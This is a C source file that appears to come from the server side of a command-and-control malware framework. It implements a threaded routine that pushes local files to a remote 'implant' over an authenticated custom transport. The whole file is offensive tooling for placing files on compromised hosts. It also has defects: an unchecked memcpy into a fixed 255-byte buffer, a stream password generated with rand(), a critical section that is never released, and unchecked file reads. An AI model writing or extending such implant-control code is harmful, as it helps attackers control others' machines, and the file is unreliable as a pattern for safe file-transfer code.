#include<stdio.h>

#include "tremont.h"

#include "transport.h"
#include "endpoint.h"
#include "jobs.h"


void _random_bytes_gen(char* buf, size_t buf_len) {
	for (size_t i = 0; i < buf_len; i++) {
		buf[i] = rand() % 256;
	}
}

struct upload_req_t {
	tremont_stream_id upload_stream;
	char stream_password[255];
	size_t stream_password_len;

	char dest_path[255];
	size_t dest_path_len;

	int64_t file_len;
};

struct upload_res_t {
	uint8_t allowed;
};

int _req_upload(endpoint_id_t endpoint_id,
	char* remote_path,
	size_t remote_path_len,
	int64_t file_len,
	tremont_stream_id* stream_id_ptr,
	struct bleeddial_ctx_t* ctx) {

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	tremont_stream_id ctrl_stream = 0;
	int res = -1;

	EnterCriticalSection(&ctx->endpoint_db_cs);

	ctrl_stream = ctx->endpoint_db
		->endpoints_by_id[endpoint_id].ctrl_stream_id;

	LeaveCriticalSection(&ctx->endpoint_db_cs);

	res = tremont_newid_nexus(stream_id_ptr, nexus);
	if (res == -1) return -1;

	tremont_accept_stream(*stream_id_ptr, 0, nexus);

	char stream_passwd[255];
	_random_bytes_gen(stream_passwd, sizeof(stream_passwd));

	tremont_auth_stream(*stream_id_ptr,
		stream_passwd,
		sizeof(stream_passwd),
		nexus
	);

	tremont_accept_stream(*stream_id_ptr, 0, nexus);

	struct upload_req_t upload_req;

	upload_req.file_len = file_len;
	upload_req.upload_stream = *stream_id_ptr;

	memcpy(upload_req.stream_password, stream_passwd, 255);
	upload_req.stream_password_len = 255;

	memcpy(upload_req.dest_path, remote_path, remote_path_len);
	upload_req.dest_path_len = remote_path_len;

	tremont_send(ctrl_stream, (byte*)&upload_req, sizeof(upload_req), nexus);

	struct upload_res_t upload_res;

	tremont_recv(ctrl_stream, (byte*)&upload_res, sizeof(upload_res), nexus);

	return upload_res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_upload(struct upload_params_t* params) {
	char alias_buf[255];
	int res = -1;

	EnterCriticalSection(&params->ctx.endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
							sizeof(alias_buf),
							params->endpoint_id,
							params->ctx.endpoint_db
	);
	if (res == -1)
		printf("Starting upload to implant %d...\n",
			params->endpoint_id);
	else
		printf("Starting upload to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	LARGE_INTEGER file_len;
	GetFileSizeEx(file_handle, &file_len);

	tremont_stream_id upload_stream;
	res = _req_upload(params->endpoint_id,
		params->remote_path,
		params->remote_path_len,
		file_len.QuadPart,
		&upload_stream,
		&params->ctx
	);
	if (res == -1) {
		printf("Not allowed to create file on endpoint\n");
		return -1;
	}

	char temp_buf[255];
	int64_t total_sent = 0;
	int read_from_file = 0;
	BOOL can_read = FALSE;

	while (total_sent < file_len.QuadPart) {
		can_read = ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		/* if(can_read == false) goto FILE_ERROR; */
		tremont_send(
			upload_stream,
			temp_buf,
			read_from_file,
			params->ctx.transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");
	
	return 0;
}